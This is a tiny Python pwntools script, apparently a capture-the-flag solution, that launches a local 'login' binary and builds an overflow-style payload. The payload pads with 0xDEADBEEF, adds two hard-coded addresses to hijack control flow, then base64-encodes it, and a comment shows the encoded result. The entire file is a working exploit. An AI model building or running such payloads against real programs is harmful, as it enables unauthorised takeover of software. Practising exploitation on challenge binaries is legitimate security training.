#coding:utf-8
from pwn import *
p=process("./login")
pay= p32(0xDEADBEEF)+p32(0x0804925F)+p32(0x0811EB40)

pay=b64e(pay)
print pay
#pay为776t3l+SBAhA6xEI
